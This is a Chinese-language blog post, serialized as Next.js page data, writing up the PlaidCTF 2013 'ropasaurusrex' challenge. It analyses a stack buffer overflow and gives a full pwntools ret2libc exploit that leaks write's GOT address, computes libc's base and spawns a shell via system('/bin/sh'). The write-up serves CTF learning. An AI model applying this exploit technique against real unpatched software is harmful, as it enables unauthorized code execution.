1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/40db9a3d7b10e1fc.css",{"as":"style"}]
3:HL["/_next/static/css/6c438bdd1a6b11fe.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","PlaidCTF-2013-ropasaurusrex-writeup","c"],{"children":["__PAGE__?{\"slug\":[\"PlaidCTF-2013-ropasaurusrex-writeup\"]}",{}]}]}]},"$undefined","$undefined",true],"$L4",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/40db9a3d7b10e1fc.css","precedence":"next"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/6c438bdd1a6b11fe.css","precedence":"next"}]],["$L5",["$","meta",null,{"name":"next-size-adjust"}]]]]]
6:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"ThemeProvider","async":false}
7:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"","async":false}
8:I{"id":"9544","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
9:I{"id":"99","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
b:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"Analytics","async":false}
4:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L6",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":[["$","div",null,{"className":"flex space-x-6 ","children":["$","p",null,{"className":"blog-name font-medium text-2xl","children":"Always Exploring"}]}],["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L7",null,{"href":"/","children":"Home"}],["$","$L7",null,{"href":"/about","children":"About"}]]}]]}]}],["$","main",null,{"children":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","PlaidCTF-2013-ropasaurusrex-writeup","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$La",null],"segment":"__PAGE__?{\"slug\":[\"PlaidCTF-2013-ropasaurusrex-writeup\"]}"},"styles":[]}],"segment":["slug","PlaidCTF-2013-ropasaurusrex-writeup","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$Lb",null,{}]]}]}]}],null]
5:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"PlaidCTF 2013 ropasaurusrex writeup - PWN"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
c:I{"id":"1753","chunks":["46:static/chunks/46-79f3cb62e0a9762a.js","49:static/chunks/app/posts/[...slug]/page-403c6a1364df7930.js"],"name":"","async":false}
a:[["$","$Lc",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"PlaidCTF 2013 ropasaurusrex writeup - PWN"}],["$","time",null,{"dateTime":"2019-12-15T15:31:03.000Z","className":"post-time","children":"December 15, 2019"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"0x00-前言","children":"0x00 前言"}],"\n",["$","p",null,{"children":["本文有关的程序可以到我的github中下载：",["$","a",null,{"href":"https://github.com/cxliker/ctf_pwn/tree/master/ropasaurusrex","children":"https://github.com/cxliker/ctf_pwn/tree/master/ropasaurusrex"}],"\n这题给了libc.so文件，变得简单了一些，省去了我们猜版本的麻烦（但是我找不到线上的环境，所以还是用不到这个给的libc.so，用本地的libc.so测试）。此题的特点在于需要我们info leak得到信息，然后计算出system的地址。"]}],"\n",["$","p",null,{"children":["文章中参考到的博客 ",["$","a",null,{"href":"http://bestwing.me/2017/03/19/stack-overflow-two-ROP/","children":"http://bestwing.me/2017/03/19/stack-overflow-two-ROP/"}]]}],"\n",["$","h1",null,{"id":"0x01-分析","children":"0x01 分析"}],"\n",["$","h2",null,{"id":"例行公事老3步之第一步checksec","children":"例行公事老3步之第一步：checksec"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["▶ checksec ropasaurusrex \n[*] ",["$","span",null,{"className":"hljs-string","children":"'/root/code/ctf/pwn/ropasaurusrex/ropasaurusrex'"}],"\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n"]}]}],"\n",["$","h2",null,{"id":"例行公事老3步之第二步运行看懂程序流程","children":"例行公事老3步之第二步：运行看懂程序流程"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":"$$ ./ropasaurusrex \nhhhhhhhhstep2\nWIN\n"}]}],"\n",["$","p",null,{"children":["程序流程简单到不能在简单了，输入一个字符串，输出一个字符串",["$","code",null,{"children":"win"}]]}],"\n",["$","h2",null,{"id":"例行公事老3步之第三部ida","children":"例行公事老3步之第三部：ida"}],"\n",["$","p",null,{"children":"因为程序也比较简单，直接看汇编代码也没问题。"}],"\n",["$","p",null,{"children":["$","img",null,{"src":"/images/6.png","alt":""}]}],"\n",["$","p",null,{"children":"可以从图中看到buf定义了0x88大小，但是却被允许输入0x100大小的字符串，由此引起了缓冲区溢出的漏洞。"}],"\n",["$","p",null,{"children":["这题正好很像之前蒸米师傅说的一道例题，引用其在文章 ",["$","em",null,{"children":"一步一步学ROP之linux_x86篇"}]," 中的一段话"]}],"\n",["$","blockquote",null,{"children":["\n",["$","p",null,{"children":["我们发现除了程序本身的实现的函数之外，我们还可以使用",["$","code",null,{"children":"read@plt()"}],"和",["$","code",null,{"children":"write@plt()"}],"函数。但因为程序本身并没有调用",["$","code",null,{"children":"system()"}],"函数，所以我们并不能直接调用",["$","code",null,{"children":"system()"}],"来获取shell。但其实我们有",["$","code",null,{"children":"write@plt()"}],"函数就够了，因为我们可以通过",["$","code",null,{"children":"write@plt()"}],"函数把",["$","code",null,{"children":"write()"}],"函数在内存中的地址也就是",["$","code",null,{"children":"write.got"}],"给打印出来。既然",["$","code",null,{"children":"write()"}],"函数实现是在libc.so当中，那我们调用的",["$","code",null,{"children":"write@plt()"}],"函数为什么也能实现",["$","code",null,{"children":"write()"}],"功能呢? 这是因为linux采用了延时绑定技术，当我们调用",["$","code",null,{"children":"write@plit()"}],"的时候，系统会将真正的",["$","code",null,{"children":"write()"}],"函数地址link到got表的",["$","code",null,{"children":"write.got"}],"中，然后",["$","code",null,{"children":"write@plit()"}],"会根据",["$","code",null,{"children":"write.got"}]," 跳转到真正的",["$","code",null,{"children":"write()"}],"函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）"]}],"\n"]}],"\n",["$","p",null,{"children":"所以题目的思路就有了："}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":["利用",["$","code",null,{"children":"write@plt"}],"构造payload leak 内中的一个函数地址"]}],"\n",["$","li",null,{"children":"通过上一步得到的地址，和libc自己计算好的offset，可以算出libc base"}],"\n",["$","li",null,{"children":["根据libc base和offset，算出",["$","code",null,{"children":"system"}],"和",["$","code",null,{"children":"/bin/sh"}],"的地址"]}],"\n",["$","li",null,{"children":"构造payload get shell"}],"\n"]}],"\n",["$","h1",null,{"id":"0x02-exp","children":"0x02 exp"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-python","children":[["$","span",null,{"className":"hljs-keyword","children":"from"}]," pwn ",["$","span",null,{"className":"hljs-keyword","children":"import"}]," *\n\nlibc = ELF(",["$","span",null,{"className":"hljs-string","children":"'libc.so.fuck'"}],")\nelf = ELF(",["$","span",null,{"className":"hljs-string","children":"'ropasaurusrex'"}],")\n\nio = process(",["$","span",null,{"className":"hljs-string","children":"'./ropasaurusrex'"}],")\n\nplt_write = elf.symbols[",["$","span",null,{"className":"hljs-string","children":"'write'"}],"]\ngot_write = elf.got[",["$","span",null,{"className":"hljs-string","children":"'write'"}],"]\nbof = ",["$","span",null,{"className":"hljs-number","children":"0x080483F4"}],"\n\npayload1 = ",["$","span",null,{"className":"hljs-string","children":"'A'"}]," * ",["$","span",null,{"className":"hljs-number","children":"140"}]," + p32(plt_write) + p32(bof) + p32(",["$","span",null,{"className":"hljs-number","children":"1"}],") + p32(got_write) + p32(",["$","span",null,{"className":"hljs-number","children":"4"}],")\n\n",["$","span",null,{"className":"hljs-built_in","children":"print"}]," ",["$","span",null,{"className":"hljs-string","children":"\"\\n#########sending payload1....#######\""}],"\nio.send(payload1)\n\nwrite_addr = u32(io.recv(",["$","span",null,{"className":"hljs-number","children":"4"}],"))\nlog.success(",["$","span",null,{"className":"hljs-string","children":"'write_addr = '"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"hex"}],"(write_addr))\n\nlibc_base = write_addr - libc.symbols[",["$","span",null,{"className":"hljs-string","children":"'write'"}],"]\nlog.success(",["$","span",null,{"className":"hljs-string","children":"'libc_base= '"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"hex"}],"(libc_base))\nsystem_addr = libc_base + libc.symbols[",["$","span",null,{"className":"hljs-string","children":"'system'"}],"]\nlog.success(",["$","span",null,{"className":"hljs-string","children":"'system_addr= '"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"hex"}],"(system_addr))\nbinsh_addr = libc_base + ",["$","span",null,{"className":"hljs-built_in","children":"next"}],"(libc.search(",["$","span",null,{"className":"hljs-string","children":"'/bin/sh'"}],"))\nlog.success(",["$","span",null,{"className":"hljs-string","children":"'binsh_addr= '"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"hex"}],"(binsh_addr))\n\n",["$","span",null,{"className":"hljs-comment","children":"# 调用system函数，参数是binsh"}],"\npayload2 = ",["$","span",null,{"className":"hljs-string","children":"'A'"}]," * ",["$","span",null,{"className":"hljs-number","children":"140"}]," + p32(system_addr) + p32(",["$","span",null,{"className":"hljs-number","children":"0xdeadbeef"}],") + p32(binsh_addr)\n\n",["$","span",null,{"className":"hljs-built_in","children":"print"}]," ",["$","span",null,{"className":"hljs-string","children":"\"\\n########sending payload2....########\""}],"\nio.send(payload2)\n\nio.interactive()\n"]}]}]]}]]}]]
